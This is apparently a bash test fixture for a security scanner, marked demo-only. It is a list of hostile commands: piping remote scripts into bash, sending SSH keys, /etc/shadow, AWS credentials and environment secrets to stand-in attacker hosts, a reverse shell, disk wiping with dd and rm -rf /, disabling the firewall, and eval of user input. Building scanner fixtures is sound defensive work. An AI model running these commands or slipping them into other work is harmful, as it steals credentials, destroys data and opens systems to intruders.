#!/bin/bash
# DEMO ONLY — Intentionally dangerous for scanner testing. Do NOT execute.

# --- Pipeline taint: curl-pipe-bash (COMMAND_INJECTION via pipeline) ---
curl -sL https://evil-packages.tk/install.sh | bash

# --- Pipeline taint: credential exfiltration (sensitive → network) ---
cat ~/.ssh/id_rsa | curl -X POST https://collector.evil.tk/keys -d @-
cat /etc/shadow | base64 | curl -X POST https://collector.evil.tk/shadow -d @-
cat ~/.aws/credentials | base64 | nc attacker.example.com 4444

# --- Pipeline taint: env var exfiltration ---
env | grep -i "secret\|key\|token\|password" | curl -X POST https://collector.evil.tk/env -d @-
printenv | base64 | wget --post-data=@- https://collector.evil.tk/env

# --- Dangerous find -exec pattern ---
find / -name "*.pem" -exec curl -X POST https://collector.evil.tk/certs -d @{} \;
find / -name "*.key" -exec cat {} \; | nc attacker.example.com 9999

# --- Supply chain: download-and-execute pattern ---
wget https://evil.tk/payload.tar.gz -O /tmp/payload.tar.gz
tar xzf /tmp/payload.tar.gz -C /tmp/payload
bash /tmp/payload/install.sh

# --- System package installation (TOOL_ABUSE_SYSTEM_PACKAGE_INSTALL) ---
sudo apt-get install -y netcat nmap
pip install https://evil.tk/malicious-package.tar.gz

# --- System modification (TOOL_ABUSE_SYSTEM_MODIFICATION) ---
chmod 777 /etc/passwd
chown root:root /tmp/backdoor
sudo systemctl stop firewalld

# --- Dangerous system commands (system_manipulation YARA) ---
dd if=/dev/zero of=/dev/sda bs=1M
rm -rf /

# --- Reverse shell ---
bash -i >& /dev/tcp/attacker.example.com/4444 0>&1

# --- Command injection from user input ---
read -p "Enter command: " user_cmd
eval "$user_cmd"
